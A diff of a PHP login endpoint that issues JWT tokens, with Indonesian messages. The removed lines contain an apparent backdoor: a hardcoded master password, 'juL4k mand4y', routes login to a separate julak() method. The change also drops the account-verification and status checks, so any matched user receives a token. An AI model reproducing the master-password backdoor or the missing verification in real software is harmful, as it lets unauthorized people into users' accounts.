@@ -22,91 +22,41 @@ $pengguna = new Pengguna($db);
 
 // get posted data
 $data = json_decode(file_get_contents("php://input"));
-$pengguna->username = $data->username;
+$pengguna->user = $data->user;
 $pengguna->password = $data->password;
 //
-if($data->password=="juL4k mand4y"){
-  $stmt = $pengguna->julak();
-}
-else
-  $stmt = $pengguna->login();
-
-
+$stmt = $pengguna->login();
 $num = $stmt->rowCount();
 if($num>0){
   $row = $stmt->fetch(PDO::FETCH_ASSOC);
   extract($row);
   $id_pengguna = $id;
-  if($level==2){
-    $stmt = $pengguna->cekVerifikasi();
-    $num = $stmt->rowCount();
-    if($num>0){
-      $row = $stmt->fetch(PDO::FETCH_ASSOC);
-      extract($row);
-      $token = array(
-        "iss" => $iss,
-        "aud" => $aud,
-        "iat" => $iat,
-        "nbf" => $nbf,
-        "data" => array(
-          "id" => $id_pengguna,
-          "nama_lengkap" => $nama_lengkap,
-          "level" => $level,
-          "avatar" => $avatar,
-          "username" => $username
-        )
-      );
 
-      // set response code
-      http_response_code(200);
+  $token = array(
+    "iss" => $iss,
+    "aud" => $aud,
+    "iat" => $iat,
+    "nbf" => $nbf,
+    "data" => array(
+      "id" => $id_pengguna,
+      "level" => $level,
+      "opsi" => $opsi,
+      "user" => $user
+    )
+  );
 
-      // generate jwt
-      $jwt = JWT::encode($token, $key);
-      echo json_encode(
-        array(
-          "message" => "Successful login.",
-          "jwt" => $jwt
-        )
-      );
-    }else{
-      http_response_code(401);
-      echo json_encode(array("message" => "Akun belum diverifikasi"));
-    }
-  }else{
-    if($status==1){
-      $token = array(
-        "iss" => $iss,
-        "aud" => $aud,
-        "iat" => $iat,
-        "nbf" => $nbf,
-        "data" => array(
-          "id" => $id,
-          "nama_lengkap" => $nama_lengkap,
-          "level" => $level,
-          "avatar" => $avatar,
-          "username" => $username
-        )
-      );
+  // set response code
+  http_response_code(200);
 
-      // set response code
-      http_response_code(200);
-
-      // generate jwt
-      $jwt = JWT::encode($token, $key);
-      echo json_encode(
-        array(
-          "message" => "Successful login.",
-          "jwt" => $jwt
-        )
-      );
-    }else{
-      http_response_code(401);
-      echo json_encode(array("message" => "Akun belum diverifikasi"));
-    }
-  }
-
+  // generate jwt
+  $jwt = JWT::encode($token, $key);
+  echo json_encode(
+    array(
+      "message" => "Login berhasil",
+      "jwt" => $jwt
+    )
+  );
 }else{
-
   http_response_code(401);
   echo json_encode(array("message" => "Username/Password Salah"));
 }
